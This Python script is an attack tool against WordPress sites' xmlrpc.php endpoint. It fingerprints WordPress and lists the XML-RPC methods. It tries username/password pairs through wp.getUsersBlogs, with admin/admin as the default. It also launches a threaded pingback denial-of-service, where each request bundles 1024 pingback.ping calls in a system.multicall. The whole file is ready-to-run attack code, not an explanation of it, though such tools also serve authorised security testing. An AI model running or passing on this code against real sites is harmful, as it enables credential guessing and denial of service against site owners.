import requests
import lxml.html
from log_colors import *
import random
import json
import urllib.parse
import argparse
import threading

requests.packages.urllib3.disable_warnings()

class PingbackDoSAttacker(threading.Thread):
    def __init__(self, url, pingback_url, timeout):
        threading.Thread.__init__(self)
        self.url, self.pingback = url, pingback_url
        self.timeout = timeout
        self.session = requests.Session()

    def run(self):
        print (LogColors.BLUE + "pingback attack: " + self.pingback + "..." + LogColors.ENDC)
        data = '<?xml version="1.0" encoding="UTF-8"?>'
        data += '<methodCall>'
        data += "<methodName>system.multicall</methodName>"
        data += '<params><param><array>'
        for i in range(1024):
            data += "<value><struct><member><name>methodName</name>"
            data += "<value>pingback.ping</value></member><member>"
            data += "<name>params</name><value><array><data>"
            data += "<value>" + self.pingback + "</value>"
            data += "<value>" + self.url + "</value></data>"
            data += "</array></value></member></struct></value>"
        data += "</array></param></params></methodCall>"
        r = self.session.post(
                self.url + '/xmlrpc.php',
                data = data,
                timeout = self.timeout, verify = False, allow_redirects = False
                )
        if r.ok:
            print (LogColors.YELLOW + r.text + LogColors.ENDC)
            print (LogColors.BLUE + "pingback DoS attack: OK...\n" + LogColors.ENDC)
        else:
            print (LogColors.RED + "pingback DoS attack: NOK...maybe DoS?" + LogColors.ENDC)

# exploiting xmlrpc.php
# check xml-rpc pingbacks
# bruteforce attacks via xml-rpc
class WordpressXMLRpc:
    headers = {"User-Agent" : "Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0"}
    def __init__(self, thread_id, url):
        self.url = url
        self.session = requests.Session()
    
    # check if url is wordpress site or not
    def is_wordpress(self):
        r = self.session.get(self.url, headers = self.headers, verify = False)
        if r.ok:
            tree = lxml.html.fromstring(r.text)
            wp = tree.xpath(".//meta[contains(@content, 'WordPress')]")
            if wp:
                wp = wp[0].get("content")
                print (LogColors.BLUE + self.url + " wordpress (" + wp + ") detected..." + LogColors.ENDC)
                return True
        return False

    # check if we have access to xmlrpc.php
    def check_access(self):
        r = self.session.get(self.url + "/xmlrpc.php", verify = False, allow_redirects = False)
        if r.status_code == 405 and "xml-rpc server accepts post requests only" in r.text.lower():
                print (LogColors.BLUE + "xmlrpc.php ready..." + LogColors.ENDC)
                return True
        print (LogColors.RED + "xmlrpc.php not ready :(" + LogColors.ENDC)
        return False

    # check xml-rpc server is enabled
    def is_vuln(self):
        vuln = False
        data = '<?xml version="1.0" encoding="utf-8"?>' 
        data += "<methodCall>" 
        data += "<methodName>system.listMethods</methodName>" 
        data += "<params></params>" 
        data += "</methodCall>"
        r = self.session.post(
                self.url + '/xmlrpc.php',
                data = data,
                timeout = 2, verify = False, allow_redirects = False
                )
        if r.ok and "demo.sayHello" in r.text:
            print (LogColors.YELLOW + "list methods:\n" + LogColors.ENDC)
            print (LogColors.YELLOW + r.text + LogColors.ENDC)
            vuln = True
        if vuln:
            print (LogColors.GREEN + "{} is vulnerable. hacked :)".format(self.url) + LogColors.ENDC)
        else:
            print (LogColors.RED + "{} is not vulnerable :(".format(self.url) + LogColors.ENDC)
        return vuln

    def say_hello(self):
        vuln = False
        data = '<?xml version="1.0" encoding="utf-8"?>' 
        data += "<methodCall>" 
        data += "<methodName>demo.sayHello</methodName>" 
        data += "<params></params>" 
        data += "</methodCall>"
        r = self.session.post(
                self.url + '/xmlrpc.php',
                data = data,
                timeout = 2, verify = False, allow_redirects = False
                )
        if r.ok and "Hello!" in r.text:
            print (LogColors.BLUE + "say hello is checked: OK...\n" + LogColors.ENDC)

    # check bruteforce attacks
    def check_bruteforce_attacks(self, username, password):
        print (LogColors.BLUE + "bruteforce attack: {}:{}...".format(username, password) + LogColors.ENDC)
        data = '<?xml version="1.0" encoding="UTF-8"?>'
        data += '<methodCall>'
        data += '<methodName>wp.getUsersBlogs</methodName> '
        data += '<params>'
        data += '<param><value>\{\{' + username + '\}\}</value></param>'
        data += '<param><value>\{\{' + password + '\}\}</value></param>'
        data += '</params>'
        data += '</methodCall>'
        r = self.session.post(
                self.url + '/xmlrpc.php',
                data = data,
                timeout = 2, verify = False, allow_redirects = False
                )
        if r.ok:
            print (LogColors.YELLOW + r.text + LogColors.ENDC)
            print (LogColors.BLUE + "bruteforce attacks is checked: OK...\n" + LogColors.ENDC)
        else:
            print (LogColors.RED + "bruteforce attacks is checked: NOK...\n" + LogColors.ENDC)

    # XML-RPC pingbacks DoS attacks checking
    # by threads
    # run server like
    # python3.8 -m http.server 8888
    def check_pingback_attacks(self, pingback_url):
        print (LogColors.BLUE + "dos attack checking..." + LogColors.ENDC)
        threadLock = threading.Lock()
        threads = [PingbackDoSAttacker(self.url, pingback_url, 10) for j in range(0, 4)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()
        print (LogColors.GREEN + "pingback DoS successfully checked :)" + LogColors.ENDC)

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', required = True, help = "target wordpress site url")
    parser.add_argument('-s', '--server', 
            default = 'http://0.0.0.0:8888',
            help = "url of server for pingback attack")
    parser.add_argument('-u', '--username',
            default = 'admin',
            help = "username for bruteforce attack check")
    parser.add_argument('-p', '--password',
            default = 'admin',
            help = "password for bruteforce attack check")
    args = vars(parser.parse_args())
    url = args['target']
    server = args['server']
    username, password = args['username'], args['password']
    cve = WordpressXMLRpc(0, url)
    cve.is_wordpress()
    cve.check_access()
    cve.is_vuln()
    cve.say_hello()
    cve.check_bruteforce_attacks(username, password)
    cve.check_pingback_attacks(server)
